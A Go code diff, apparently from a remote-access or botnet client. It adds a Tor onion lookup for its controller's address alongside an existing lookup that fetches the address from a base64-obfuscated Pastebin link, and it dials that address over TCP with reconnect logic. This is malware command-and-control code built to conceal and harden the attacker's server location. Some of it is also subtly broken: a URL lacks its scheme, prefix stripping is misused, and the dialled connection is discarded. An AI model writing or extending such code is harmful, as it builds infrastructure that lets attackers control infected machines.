@@ -17,7 +17,7 @@ var Connection net.Conn
 var ip string
 
 func Connect() {
-	ip = GetIp()
+	ip = getIp()
 	_, err := net.Dial("tcp", ip)
 	if err != nil {
 		fmt.Println("error")
@@ -36,7 +36,15 @@ func Reconnect() {
 	}
 }
 
-func GetIp() string {
+func getIPTor() string {
+	// use tikedzh6cg5unkrf.onion/ip.html
+	resp, _ := http.Get("tikedzh6cg5unkrf.onion.to/ip.html")
+	defer resp.Body.Close()
+	respBody, _ := ioutil.ReadAll(resp.Body)
+	return strings.TrimLeft(string(respBody), "tcp://")
+}
+
+func getIp() string {
 	resp, _ := http.Get(base64.Base64Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvQnVHOTdCU2s="))
 	defer resp.Body.Close()
 	respBody, _ := ioutil.ReadAll(resp.Body)
